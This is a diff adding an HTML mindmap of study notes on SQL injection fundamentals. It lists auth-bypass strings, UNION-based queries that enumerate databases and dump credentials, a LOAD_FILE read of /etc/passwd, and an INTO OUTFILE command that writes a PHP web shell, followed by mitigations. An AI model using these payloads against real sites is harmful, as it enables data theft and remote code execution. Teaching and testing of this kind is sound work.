@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQL Injection Fundamentals — Mindmap</title>
+<style>
+  :root { color-scheme: light dark; }
+  html, body { margin: 0; height: 100%; }
+  body { background: #faf8f8; }
+  @media (prefers-color-scheme: dark) { body { background: #1e1e21; } }
+  svg.markmap { width: 100%; height: 100vh; display: block; }
+</style>
+<script>
+  window.markmap = {
+    autoLoader: {
+      toolbar: true,
+      options: { maxWidth: 320, spacingVertical: 8, paddingX: 16 },
+    },
+  }
+</script>
+<script async src="https://cdn.jsdelivr.net/npm/markmap-autoloader@0.18.12"></script>
+</head>
+<body>
+  <div class="markmap">
+    <script type="text/template">
+# SQL Injection Fundamentals
+## 🎯 Main Idea
+- Learn how relational databases (MySQL) and SQL queries work, then how unsanitized user input placed into SQL queries creates SQL Injection (SQLi).
+- Goal: subvert query logic to bypass authentication, enumerate the database, read/write files, and ultimately gain a web shell.
+
+## 💥 Attack / Exploit Vectors
+### SQLi Discovery
+- Break out of the query with special chars to trigger errors / behaviour changes.
+- **Commands**
+  - `'` — inject single quote to cause an SQL syntax error (detects injection)
+  - `admin'` — test input to observe error behaviour
+### Authentication Bypass (Subverting Query Logic)
+- Use OR logic or comments so the WHERE clause always evaluates true.
+- **Commands**
+  - `admin' or '1'='1` — basic OR-based auth bypass
+  - `' or '1'='1' -- -` — always-true condition commenting out the rest
+### Using Comments
+- Comment out the remainder of the original query to control execution.
+- **Commands**
+  - `admin')-- -` — auth bypass closing a parenthesis then commenting out
+  - `-- -` / `#` — MySQL inline comment terminators (note trailing space after `-- `)
+### Union-based Injection
+- Append a UNION SELECT to exfiltrate data from other tables; column count and types must match.
+- **Commands**
+  - `' order by 1-- -` — detect number of columns via ORDER BY (increment until error)
+  - `cn' UNION select 1,2,3-- -` — detect column count via UNION
+  - `cn' UNION select 1,@@version,3,4-- -` — basic UNION injection into a visible column
+  - `UNION select username, 2, 3, 4 from passwords-- -` — dump data via 4-column UNION
+### Database Enumeration
+- Fingerprint the DBMS then walk INFORMATION_SCHEMA to map databases, tables, columns, and dump data.
+- **Commands**
+  - `SELECT @@version` — fingerprint MySQL with query output
+  - `SELECT SLEEP(5)` — blind fingerprint (no visible output)
+  - `cn' UNION select 1,database(),2,3-- -` — current database name
+  - `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` — list all databases
+  - `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` — list tables in a database
+  - `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` — list columns in a table
+  - `cn' UNION select 1, username, password, 4 from dev.credentials-- -` — dump data from another database's table
+### Privilege Enumeration
+- Determine current user and whether file read/write is permitted.
+- **Commands**
+  - `cn' UNION SELECT 1, user(), 3, 4-- -` — current user
+  - `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` — check admin (SUPER) privilege
+  - `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` — list all user privileges
+  - `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` — check dirs reachable via MySQL
+### Reading Files via SQLi
+- With FILE privilege, read local files through the injection.
+- **Commands**
+  - `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` — read a local file
+### Writing Files / Web Shell
+- With FILE privilege and a writable web root (secure_file_priv empty), write files to get RCE.
+- **Commands**
+  - `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` — write a string to a local file
+  - `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` — write a PHP web shell to the web root
+
+## 🛠️ Key Tools & Concepts
+- MySQL / `mysql` CLI — `mysql -u root -h <host> -P 3306 -p` to connect and run SQL
+- INFORMATION_SCHEMA — metadata database (SCHEMATA, TABLES, COLUMNS) used for enumeration
+- Operator precedence — `/ * %` > `+ -` > comparisons > NOT > AND > OR (affects payload crafting)
+- `LOAD_FILE()` / `INTO OUTFILE` — file read/write primitives
+- `secure_file_priv` — MySQL setting controlling file read/write locations
+- PayloadsAllTheThings — reference list of auth-bypass payloads
+
+## 🛡️ Mitigations
+- Input sanitization — escape/remove special characters from user input
+- Input validation — whitelist expected input format
+- Parameterized (prepared) queries — separate code from data
+- Least privilege — restrict DB user rights (no FILE/admin privileges)
+- Web Application Firewall (WAF) — filter malicious requests
+    </script>
+  </div>
+</body>
+</html>
